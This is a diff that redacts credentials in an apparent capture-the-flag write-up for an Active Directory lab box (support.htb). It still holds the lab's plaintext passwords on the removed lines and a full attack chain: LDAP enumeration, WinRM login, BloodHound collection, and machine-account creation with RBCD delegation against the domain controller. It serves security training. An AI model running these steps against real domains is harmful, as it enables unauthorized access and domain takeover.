@@ -166,8 +166,8 @@ A hardcoded encrypted LDAP password was discovered in the binary logic. The bina
 
 Recovered hardcoded LDAP password:
 
+```text
 [REDACTED_PASSWORD]
-nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
 ```
 
 This credential was used by the binary to query LDAP.
@@ -183,7 +183,7 @@ A useful way to query LDAP is with `ldapsearch`:
 ```bash
 ldapsearch -x -H ldap://[REDACTED_TARGET_IP] \
 -D 'support\ldap' \
--w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
+-w '[REDACTED_PASSWORD]' \
 -b 'dc=support,dc=htb'
 ```
 
@@ -197,8 +197,8 @@ The `info` field contained a password-like value.
 
 Recovered `support` user password:
 
+```text
 [REDACTED_PASSWORD]
-Ironside47pleasure40Watchful
 ```
 
 ---
@@ -210,7 +210,7 @@ Port `5985` was open, which allowed PowerShell remoting through WinRM.
 The `support` credential was tested with Evil-WinRM:
 
 ```bash
-evil-winrm -i [REDACTED_TARGET_IP] -u support -p 'Ironside47pleasure40Watchful'
+evil-winrm -i [REDACTED_TARGET_IP] -u support -p '[REDACTED_PASSWORD]'
 ```
 
 After login, the user flag could be read from the support user’s desktop.
@@ -234,7 +234,7 @@ Active Directory data was collected for BloodHound.
 
 ```bash
 bloodhound-python -u support \
--p 'Ironside47pleasure40Watchful' \
+-p '[REDACTED_PASSWORD]' \
 -d support.htb \
 -ns [REDACTED_TARGET_IP] \
 -c all
@@ -272,7 +272,7 @@ Environment variables were set for cleaner command usage:
 export DC=[REDACTED_TARGET_IP]
 export DOMAIN=support.htb
 export USER=support
-export PASS='Ironside47pleasure40Watchful'
+export PASS='[REDACTED_PASSWORD]'
 ```
 
 ---
@@ -489,21 +489,21 @@ tree UserInfo
 ```bash
 ldapsearch -x -H ldap://[REDACTED_TARGET_IP] \
 -D 'support\ldap' \
--w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
+-w '[REDACTED_PASSWORD]' \
 -b 'dc=support,dc=htb'
 ```
 
 ### WinRM
 
 ```bash
-evil-winrm -i [REDACTED_TARGET_IP] -u support -p 'Ironside47pleasure40Watchful'
+evil-winrm -i [REDACTED_TARGET_IP] -u support -p '[REDACTED_PASSWORD]'
 ```
 
 ### BloodHound
 
 ```bash
 bloodhound-python -u support \
--p 'Ironside47pleasure40Watchful' \
+-p '[REDACTED_PASSWORD]' \
 -d support.htb \
 -ns [REDACTED_TARGET_IP] \
 -c all
@@ -514,12 +514,12 @@ bloodhound-python -u support \
 ```bash
 echo "[REDACTED_TARGET_IP] support.htb dc.support.htb dc" | sudo tee -a /etc/hosts
 
-impacket-addcomputer 'support.htb/support:Ironside47pleasure40Watchful' \
+impacket-addcomputer 'support.htb/support:[REDACTED_PASSWORD]' \
 -dc-ip [REDACTED_TARGET_IP] \
 -computer-name 'G10D$' \
 -computer-pass '[REDACTED_PASSWORD]'
 
-impacket-rbcd 'support.htb/support:Ironside47pleasure40Watchful' \
+impacket-rbcd 'support.htb/support:[REDACTED_PASSWORD]' \
 -dc-ip [REDACTED_TARGET_IP] \
 -delegate-from 'G10D$' \
 -delegate-to 'DC$' \
